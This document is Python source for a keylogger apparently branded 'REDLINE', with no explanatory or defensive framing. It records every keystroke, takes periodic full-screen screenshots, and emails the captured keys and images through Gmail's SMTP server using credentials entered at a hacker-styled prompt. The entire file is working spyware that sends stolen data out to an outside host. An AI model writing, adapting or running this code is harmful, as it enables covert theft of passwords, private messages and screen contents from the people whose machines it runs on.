import pynput
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
from colorama import Fore
from io import BytesIO
import time

def email_log():
    email = input(f"""
╔═══[root@{Fore.LIGHTRED_EX}GMAIL{Fore.RESET}]~$
╚══> """)

    password = input(f"""
╔═══[root@{Fore.LIGHTRED_EX}PASSWORD{Fore.RESET}]~$
╚══> """)
    
    log_time = input(f"""{Fore.WHITE}
╔═══[root@{Fore.LIGHTRED_EX}LOG_TIME{Fore.RESET}]~$
╚══> {Fore.RESET}""")

    key_logs = []

    print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.WHITE}Start{Fore.RESET} {Fore.LIGHTRED_EX}>{Fore.RESET} {email}")
    print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.WHITE}Sending keylogger in [{log_time}] seconde...{Fore.RESET} {Fore.LIGHTRED_EX}>{Fore.RESET} {email}")

    def send_email(subject, body, screenshot):
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = email
            msg['Subject'] = subject

            msg.attach(MIMEText(body, 'plain'))

            part = MIMEBase('application', 'octet-stream')
            part.set_payload(screenshot.getvalue())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="screenshot.png"')
            msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
            server.quit()

            print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.WHITE}SENT {Fore.RED}>{Fore.RESET} {email}{Fore.RESET}")
        except Exception as e:
            print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.LIGHTRED_EX}SENT ERROR{Fore.RESET} > {e}")

    def capture_screenshot():
        try:
            screenshot = ImageGrab.grab()
            buffer = BytesIO()
            screenshot.save(buffer, format="PNG")
            buffer.seek(0)
            return buffer
        except Exception as e:
            print(f"[{Fore.LIGHTGREEN_EX}INFO{Fore.RESET}] {Fore.RED}ERROR SCREENSHOT : {e}{Fore.RESET}")
            return None

    def email_logger():
        while True:
            time.sleep(int(log_time))
            if key_logs:
                screenshot_data = capture_screenshot()
                if screenshot_data:
                    send_email(
                        "[REDLINE] Keylogger",
                        "".join(key_logs),
                        screenshot_data
                    )
                key_logs.clear()

    def on_press(key):
        key_logs.append(str(key).replace("'", "") + " ")

    logger_thread = threading.Thread(target=email_logger, daemon=True)
    logger_thread.start()

    with Listener(on_press=on_press) as listener:
        listener.join()



